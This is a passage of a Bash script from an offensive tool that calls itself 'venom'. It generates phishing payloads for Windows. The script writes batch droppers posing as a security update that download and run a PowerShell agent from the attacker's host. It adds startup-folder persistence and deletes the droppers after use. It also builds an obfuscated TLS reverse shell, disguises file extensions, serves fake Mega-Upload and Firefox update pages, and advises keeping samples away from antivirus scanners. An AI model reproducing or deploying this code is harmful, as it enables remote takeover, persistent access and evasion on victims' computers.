echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
## START HANDLER
# xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
gnome-terminal --title="NETCAT LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "sudo nc -lvvp $lport" > /dev/null 2>&1
sleep 2


## Clean old files
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1

## Build Report File in output folder ..
if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" ]; then
   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.del
   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.del
   echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
   echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.del
   zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy\ndelete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.del" --info --width 300 > /dev/null 2>&1
fi

sh_menu
}




# --------------------------------------------------
# Reverse OpenSSL Powershell shell
# original shell: @int0x33
# --------------------------------------------------
sh_evasion2 () {
Colors;

imp=$(which openssl)
## Make sure openssl dependencie its installed
if ! [ "$?" -eq "0" ]; then
   echo "${RedBg}[x] [openssl] package not found, Please install it .."${Reset};sleep 1
   echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}execute${BlueF}]${YellowF} sudo apt-get install openssl"${Reset};sleep 4
   sh_exit
fi


## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2


## Store User Inputs (bash variable declarations)..
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
if [ -z "$NaM" ]; then NaM="Security-Update";fi
if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi


## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
# display final settings to user
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    CN NAME  : $CN
    LOLBin   : Powershell (DownloadFile)
    DROPPER  : $IPATH/output/$Drop.bat
    AGENT    : $IPATH/output/$NaM.ps1
    UPLOADTO : $rpath => ($wvd)
!
echo "---"


## BUILD DROPPER
# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
else
   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
fi

if [ "$persistence" = "Dont Add Persistence" ]; then
   ## Default dropper Build
   echo "@echo off" > $IPATH/output/$Drop.bat
   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
   echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
   echo "Exit" >> $IPATH/output/$Drop.bat
 else
   ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
   echo "@echo off" > $IPATH/output/$Drop.bat
   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
   echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
   ## Persistence Module Function (VBScript|BATch)
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      ## Silent Persistence script execution (no terminal prompt) using VBS script.
      echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.vbs\"" >> $IPATH/output/$Drop.bat
   else
      ## Persistence script execution (minimized terminal prompt) using BATCH script.
      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo :: Framework: venom v1.0.17 - shinigami >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\"^|findstr /C:\"ESTABLISHED\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo if %%ERRORLEVEL%% EQU 0 (goto :EOF) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat   
      echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo :EOF >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
      echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.bat
   fi
   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
   echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
   echo "Exit" >> $IPATH/output/$Drop.bat
fi


## Build Reverse TCP Powershell Shell (OpenSSL).
# Obfuscating rev tcp PS shell syscalls
Length=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
SysCall=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length)
syscallvar="\$$SysCall"
Length2=$(cat /dev/urandom | tr -dc '3-9' | fold -w 1 | head -n 1)
SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
syscallvar2="\$$SysCall2"

echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
echo "" > $IPATH/output/$NaM.ps1
echo "\$SSLStreamTls = \"gnidocnEiicsA.txeT.metsyS\";" >> $IPATH/output/$NaM.ps1
echo "\$CharArray = \$SSLStreamTls.ToCharArray();" >> $IPATH/output/$NaM.ps1
echo "[Array]::Reverse(\$CharArray);" >> $IPATH/output/$NaM.ps1
echo "$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "\$VoidBuff = \"tneilCpcT.stekcoS.teN\";" >> $IPATH/output/$NaM.ps1
echo "\$Cert = \$VoidBuff.ToCharArray();" >> $IPATH/output/$NaM.ps1
echo "[Array]::Reverse(\$Cert);" >> $IPATH/output/$NaM.ps1
echo "$syscallvar = (\$Cert -Join '');" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
echo "" >> $IPATH/output/$NaM.ps1
echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
echo "   \$sendback2 = \$sendback + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
echo "}" >> $IPATH/output/$NaM.ps1


cd $IPATH/output
## Generate SSL certificate (openssl)
# Ramdomly chose the openssl settings (to make diferent SHA)
conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
if [ "$conv" = "1" ]; then
   days="245";contry="US";localidade="Boston";LTDR="Michigan"
elif [ "$conv" = "2" ]; then
   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
else 
   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
fi

## Delete old certs to prevent future errors.
rm $IPATH/output/cert.pem > /dev/nul 2>&1
rm $IPATH/output/key.pem > /dev/nul 2>&1
echo "${BlueF}[☠]${white} Building SSL certificates (openssl) .."${Reset};sleep 2
gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
if [ -e cert.pem ]; then
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenBg}OK${white}])${white} ..";sleep 2
else
   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedBg}FAIL${white}])${Reset} ..";sleep 2
fi
cd $IPATH


## Building Download webpage
echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
if [ "$phish" = "Mega-Upload (default)" ]; then
   cd $IPATH/templates/phishing
   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
else
   cd $IPATH/templates/phishing/firefox
   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
fi
cd $IPATH


cd $IPATH/output
## Copy files to apache2 webroot
zip $Drop.zip $Drop.bat -q
echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
cp $IPATH/aux/webserver.ps1 $ApAcHe/webserver.ps1 > /dev/nul 2>&1
cd $IPATH


## Print attack vector on terminal
echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
echo "${BlueF}---"
echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
if [ "$phish" = "Mega-Upload (default)" ]; then
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
else
   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
fi
echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
echo "${BlueF}---"${Reset};
echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
read odf
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
cd $IPATH/output
## START HANDLER
# xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
gnome-terminal --title="OPENSSL LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1
cd $IPATH
sleep 2


## Clean old files
echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/Download.html > /dev/nul 2>&1
rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
rm $ApAcHe/webserver.ps1 > /dev/nul 2>&1
rm $IPATH/output/.ps1 > /dev/nul 2>&1
rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1


cd $IPATH/output
## Persistence handler script (zip) creation ..
if [ "$persistence" = "Add persistence" ]; then

   dtr=$(date|awk {'print $2,$3,$4,$5'})
   cp $IPATH/bin/handlers/handler.sh $IPATH/output/handler.sh
   ## Config handler script variable declarations ..
   one=$(cat handler.sh | egrep -m 1 "DOMAIN") > /dev/null 2>&1
   sed -i "s|$one|DOMAIN='$CN'|" handler.sh
   two=$(cat handler.sh | egrep -m 1 "ID") > /dev/null 2>&1
   sed -i "s|$two|ID='$Id'|" handler.sh
   tree=$(cat handler.sh | egrep -m 1 "CLIENT") > /dev/null 2>&1
   sed -i "s|$tree|CLIENT='$NaM.ps1'|" handler.sh
   four=$(cat handler.sh | egrep -m 1 "LPORT") > /dev/null 2>&1
   sed -i "s|$four|LPORT='$lport'|" handler.sh
   five=$(cat handler.sh | egrep -m 1 "LHOST") > /dev/null 2>&1
   sed -i "s|$five|LHOST='$lhost'|" handler.sh
   seven=$(cat handler.sh | egrep -m 1 "RPATH") > /dev/null 2>&1
   sed -i "s|$seven|RPATH='$rpath\\\\$NaM.ps1'|" handler.sh
   oito=$(cat handler.sh | egrep -m 1 "FIRST_ACCESS") > /dev/null 2>&1
   sed -i "s|$oito|FIRST_ACCESS='$dtr'|" handler.sh
   nove=$(cat handler.sh | egrep -m 1 "DROPPER") > /dev/null 2>&1
   sed -i "s|$nove|DROPPER='$Drop.bat'|" handler.sh

   ## Obfuscation=on (vbs persistence script)
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      sed -i "s|.update.bat|.update.vbs|" handler.sh
   fi

   ## Write README file (to be compressed)
   echo "Id          : $Id" > README
   echo "Description : Reverse OpenSSL Powershell Shell" >> README
   echo "Categorie   : Amsi Evasion (agent nº2)" >> README
   echo "Active On   : $dtr" >> README
   echo "Lhost|Lport : $lhost:$lport" >> README
   echo "" >> README
   echo "How to Instructions" >> README
   echo "-------------------" >> README
   echo "1 - cd output" >> README
   echo "2 - unzip handler_ID:$Id.zip" >> README
   echo "3 - sh handler.sh" >> README
   echo "" >> README
   echo "Detail Description" >> README
   echo "------------------" >> README
   echo "If sellected 'add persistence' to dropper in venom amsi evasion" >> README
   echo "agent nº2 build. Them the dropper when executed it will create in" >> README
   echo "remote target startup folder a script named 'KB4524147_$Id.update.bat'" >> README
   echo "that beacons home from 8 to 8 sec until a valid tcp connection is found" >> README
   echo "and creates this handler file (zip) to store attacker handler settings." >> README


   ## zip handler files
   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
   zip handler_ID:$Id.zip handler.sh cert.pem key.pem README -m -q
   cd $IPATH
   zenity --title="☠ Reverse TCP Powershell Shell (OpenSSL) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
else
   ## Delete certs IF persitence was NOT sellected.
   rm $IPATH/output/cert.pem > /dev/nul 2>&1
   rm $IPATH/output/key.pem > /dev/nul 2>&1
fi
cd $IPATH
sh_menu
}




# ----------------------------------------------
# Reverse TCP Powershell Shell (hex obfuscation)
# ----------------------------------------------
sh_evasion3 () {
Colors;

## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
echo "---"
echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
echo "- Please Dont test samples on Virus Total or on similar"${Reset};
echo "- online scanners, because that will shorten the payload life."${Reset};
echo "- And in testings also remmenber to stop the windows defender"${Reset};
echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
echo "---"
sleep 2


## Store User Inputs (bash variable declarations)..
easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1


## Setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="666";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$NaM" ]; then NaM="Security-Update";fi
if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi


## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn.update }
Id=$(cat /dev/urandom | tr -dc '0-7' | fold -w 3 | head -n 1)
wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||")
## Random chose one fake extension.
# to Masquerade the dropper real extension (MITRE T1036)
index=$(cat /dev/urandom | tr -dc '1-5' | fold -w 1 | head -n 1)
if [ "$index" = "1" ] || [ "$index" = "3" ]; then
   ext="crdownload"
elif [ "$index" = "2" ]; then
   ext="cfg"
elif [ "$index" = "5" ]; then
   ext="tmp"
elif [ "$index" = "4" ]; then
   ext="bin"
fi


## Display final settings to user.
echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
echo "${BlueF}[${YellowF}i${BlueF}]${white} Random Extension:([${GreenBg}$ext${white}]) (MITRE T1036)"${Reset};sleep 2
echo ${BlueF}"---"
cat << !
    LPORT    : $lport
    LHOST    : $lhost
    LOLBin   : bitsadmin (DownloadFile)
    DROPPER  : $IPATH/output/$Drop.$ext.bat
    AGENT    : $IPATH/output/$NaM.ps1
    UPLOADTO : $rpath => ($wvd)
!
echo "---"


## BUILD DROPPER (to download/execute our agent.ps1).
# echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.vbs on remote startup folder that\nruns '$NaM.ps1' in stealth mode on target startup." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
else
   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\ndropper.bat will create KB4524147_$Id.update.bat on remote startup folder that\nruns '$NaM.ps1' with 8 sec of interval at startup until a valid connection its found." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
fi

if [ "$persistence" = "Dont Add Persistence" ]; then
   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
   echo "powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://$lhost/$NaM.ps1 $rpath\\$NaM.ps1" >> $IPATH/output/$Drop.$ext.bat
   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
   echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution
   echo "Exit" >> $IPATH/output/$Drop.$ext.bat
else
   ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.$ext.bat ..${white}";sleep 2
   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
   echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.$ext.bat
   echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.$ext.bat
   echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
   ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
   echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
   echo "powershell -w 1 bitsadmin /tRaNsFeR googlestore /dOwNlOaD /priority foreground http://$lhost/$NaM.ps1 $rpath\\$NaM.ps1" >> $IPATH/output/$Drop.$ext.bat
   ## Persistence Module Function (VBScript|BATch)
   if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
      ## Silent Persistence script execution (no terminal prompt) using VBS script.
     echo "echo CreateObject(\"WScript.Shell\").Exec \"PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.vbs\"" >> $IPATH/output/$Drop.$ext.bat
   else
      ## Persistence script execution (minimized terminal prompt) using BATCH script.
      echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$Id.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
